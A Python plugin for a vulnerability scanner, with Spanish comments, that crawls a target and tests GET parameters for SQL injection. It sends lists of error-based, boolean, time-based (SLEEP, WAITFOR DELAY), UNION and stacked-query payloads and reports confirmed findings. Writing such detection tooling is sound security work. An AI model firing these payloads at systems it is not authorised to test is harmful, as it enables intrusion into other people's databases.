#!/usr/bin/env python3
"""Plugin SQLi: inyeccion SQL con confirmacion para reducir falsos positivos.

Mejora v2:
  * Usa la superficie REAL del crawler (formularios GET y parametros
    descubiertos) ademas de las rutas por defecto. Asi detecta endpoints
    como /listproducts.php?cat=1 que no estan hardcodeados.
  * Confirmacion basada en diferencia booleana (OR 1=1 vs AND 1=2) y en
    errores SQL literales. Si la condicion verdadera devuelve contenido y
    la falsa se vacia/cambia drasticamente => confirmado (menos falsos
    negativos que el diff de longitud simple).
"""
import re
import time
import urllib.parse

SQLI_ERRORS = ["error in your sql", "sql syntax", "sqlite", "you have an error",
               "unclosed quotation mark", "sqlstate", "ora-", "pg_", "warning: mysqli",
               "microsoft sql server", "syntax error", "near \"", "unrecognized token",
               "operationalerror", "database error", "could not", "sql command not properly ended",
               "you have an error in your sql syntax"]

# condiciones booleanas para inyeccion ciega (si la base es MySQL/SQLite/etc.)
BOOL_TRUE = ["' OR '1'='1", "\" OR \"1\"=\"1", "1 OR 1=1", "1) OR (1=1",
             "1' OR '1'='1' -- ", "') OR ('1'='1"]
BOOL_FALSE = ["' AND '1'='2", "\" AND \"1\"=\"2", "1 AND 1=2", "1) AND (1=2",
              "1' AND '1'='2' -- ", "') AND ('1'='2"]
SQLI_TIME_SIGNATURES = ["sleep(", "dbms_lock.sleep", "waitfor delay", "pg_sleep", "sqlite3.sleep"]
# UNION-based y stacked queries
UNION_PAYLOADS = [
    "' UNION SELECT NULL-- ",
    "' UNION SELECT NULL,NULL-- ",
    "' UNION SELECT NULL,NULL,NULL-- ",
    "' ORDER BY 1-- ",
    "' ORDER BY 2-- ",
    "' ORDER BY 3-- ",
]
STACKED_PAYLOADS = [
    "'; SELECT 1-- ",
    "'; WAITFOR DELAY '0:0:1'-- ",
    "1; SELECT 1-- ",
]

# rutas comunes de labs/apps vulnerables (amplia la superficie por defecto)
SQLI_PATHS = ["", "/listproducts.php", "/product.php", "/products.php",
               "/artists.php", "/artist.php", "/item.php", "/view.php",
               "/news.php", "/article.php", "/post.php", "/doc", "/note",
               "/search", "/category", "/cat", "/show", "/detail", "/books"]
SQLI_PARAMS = ["id", "cat", "q", "page", "search", "note", "category",
               "pid", "uid", "user", "item", "product", "artist", "idp",
               "cid", "bid", "aid"]


def _norm_body(b):
    return (b or "").lower()


def run(ctx):
    from engine import confirm_sqli_boolean

    # ---- Construir superficie (url, param) desde crawler + defaults ----
    targets = []  # lista de (url_base, param)
    seen = set()

    def add(url_base, param):
        key = (url_base.rstrip("/"), param)
        if key not in seen:
            seen.add(key)
            targets.append((url_base, param))

    crawl = getattr(ctx, "_crawl", {}) or {}
    # formularios GET del crawler
    for f in (crawl.get("forms") or []):
        if (f.get("method") or "GET").upper() == "GET":
            act = f.get("action") or ctx.target
            for p in (f.get("params") or []):
                add(act, p)
    # parametros vistos en cualquier query: probarlos contra el target base
    # Y tambien contra cada URL descubierta por el crawler (mapeo param->url)
    crawled_urls = sorted(crawl.get("urls") or set())
    for p in (crawl.get("params") or set()):
        p = str(p)
        if p:
            add(ctx.target, p)
            for u in crawled_urls:
                if u.startswith(ctx.target.rstrip("/")):
                    # usar la URL sin query para inyectar el param limpio despues
                    add(u.split("?")[0], p)
    # rutas/params por defecto
    for sp in SQLI_PATHS:
        base_url = ctx.target.rstrip("/") + sp
        for param in SQLI_PARAMS:
            add(base_url, param)

    hits = []
    _sqli_max = 200
    for base_url, param in targets:
        if len(hits) >= _sqli_max:
            ctx.emit({"type": "log", "msg": f"SQLi: tope alcanzado ({_sqli_max} hits), se detiene", "level": "warn"})
            break
        if ctx.ctrl("sqli") in ("stop", "skip"):
            break
        base = ctx.req("GET", base_url, {param: "1"})
        if base.get("err"):
            continue
        base_body = _norm_body(base.get("body", ""))
        base_len = len(base.get("body", ""))
        base_code = base.get("code")
        confirmed = False
        detail = ""
        evidence = {}
        # 1) error SQL literal
        for p in ["'", "\"", "' -- -", "1'"]:
            if ctx.ctrl("sqli") in ("stop", "skip"):
                break
            rr = ctx.req("GET", base_url, {param: p})
            if any(s in _norm_body(rr.get("body", "")) for s in SQLI_ERRORS):
                confirmed = True
                detail = f"error SQL literal con payload '{p}'"
                evidence = {"payload": p, "technique": "error-based"}
                break
        # 2) diferencia booleana ciega (OR 1=1 vs AND 1=2)
        if not confirmed:
            for t, f in zip(BOOL_TRUE, BOOL_FALSE):
                if ctx.ctrl("sqli") in ("stop", "skip"):
                    break
                if confirm_sqli_boolean(ctx, base_url, param, t, f):
                    confirmed = True
                    detail = f"diferencia booleana (OR 1=1 vs AND 1=2) en param '{param}'"
                    evidence = {
                        "true_payload": t,
                        "false_payload": f,
                        "base_len": base_len,
                        "technique": "boolean-based"
                    }
                    break
        # 3) time-based blind (sleep/delay)
        time_evidence = None
        if not confirmed:
            for tp in ["' AND SLEEP(3)-- ", "1'; WAITFOR DELAY '0:0:3'-- ", "' AND pg_sleep(3)-- "]:
                if ctx.ctrl("sqli") in ("stop", "skip"):
                    break
                t0 = time.time()
                rr = ctx.req("GET", base_url, {param: tp})
                elapsed = time.time() - t0
                body_l = (rr.get("body") or "").lower()
                if elapsed > 2.5 or any(s in body_l for s in SQLI_TIME_SIGNATURES):
                    confirmed = True
                    detail = f"time-based (SLEEP/WAITFOR/PG_SLEEP) en param '{param}' (~{elapsed:.1f}s)"
                    time_evidence = {
                        "payload": tp,
                        "elapsed": round(elapsed, 2),
                        "technique": "time-based"
                    }
                    break
        # 4) UNION-based y ORDER BY
        union_evidence = None
        if not confirmed:
            for up in UNION_PAYLOADS:
                rr = ctx.req("GET", base_url, {param: up})
                body = rr.get("body") or ""
                code = rr.get("code") or 0
                if 200 <= int(code) < 300 and len(body) != base_len:
                    confirmed = True
                    detail = f"UNION/ORDER BY con payload '{up}' (len {base_len} -> {len(body)})"
                    union_evidence = {
                        "payload": up,
                        "base_len": base_len,
                        "new_len": len(body),
                        "technique": "union-based"
                    }
                    break
        # 5) Stacked queries
        stacked_evidence = None
        if not confirmed:
            for sp in STACKED_PAYLOADS:
                rr = ctx.req("GET", base_url, {param: sp})
                body = rr.get("body") or ""
                code = rr.get("code") or 0
                if 200 <= int(code) < 300 and len(body) != base_len:
                    confirmed = True
                    detail = f"stacked query con payload '{sp}' (len {base_len} -> {len(body)})"
                    stacked_evidence = {
                        "payload": sp,
                        "base_len": base_len,
                        "new_len": len(body),
                        "technique": "stacked-queries"
                    }
                    break
        if confirmed:
            hits.append(f"{base_url} {param}")
            if detail.startswith("error SQL literal"):
                sqli_type = "Error-based SQLi"
            elif detail.startswith("time-based"):
                sqli_type = "Time-based SQLi"
                evidence = time_evidence or {}
            elif detail.startswith("UNION") or detail.startswith("stacked"):
                sqli_type = "Union-based SQLi" if detail.startswith("UNION") else "Stacked-queries SQLi"
                evidence = union_evidence or stacked_evidence or {}
            else:
                sqli_type = "Boolean-based SQLi"
                evidence = evidence or {}
            ev_payload = evidence.get("true_payload") or evidence.get("payload") or "<payload>"
            ev_request = f"GET {base_url}?{param}={ev_payload}"
            base_resp = base.get("body", "") or ""
            true_resp = "" if sqli_type == "Error-based SQLi" else (base_resp[:500])
            false_resp = "" if sqli_type == "Error-based SQLi" else (base_resp[:500])
            if sqli_type == "Boolean-based SQLi":
                true_resp = ctx.req("GET", base_url, {param: evidence.get("true_payload", "")}).get("body", "")[:500]
                false_resp = ctx.req("GET", base_url, {param: evidence.get("false_payload", "")}).get("body", "")[:500]
            evidence["base_response"] = base_resp[:500]
            evidence["true_response"] = true_resp
            evidence["false_response"] = false_resp
            ctx.emit({
                "type": "finding",
                "severity": "high",
                "module": "sqli",
                "confidence": "confirmed",
                "detail": f"SQL Injection — CONFIRMED\n    URL: {base_url}\n    Parámetro: {param}\n    Método: GET\n    Tipo: {sqli_type}\n    Confidence: High\n    Evidence: {detail}\n    Template/rule: HTScanner sqli plugin (multi-técnica)\n    Request de verificación: reproducible",
                "evidence": {
                    "url": base_url,
                    "param": param,
                    "method": "GET",
                    "type": sqli_type,
                    "confidence": "confirmed",
                    "detail": detail,
                    "template": "HTScanner sqli plugin (multi-técnica)",
                    "request": f"GET {base_url}?{param}={ev_payload}",
                    "technique": evidence.get("technique"),
                    "base_response": base_resp[:500],
                    "true_response": true_resp,
                    "false_response": false_resp,
                    "elapsed": evidence.get("elapsed"),
                }
            })
    ctx.emit({"type": "module", "name": "sqli", "status": "done",
              "msg": f"SQLi: {len(hits)} confirmada(s)", "findings": hits})
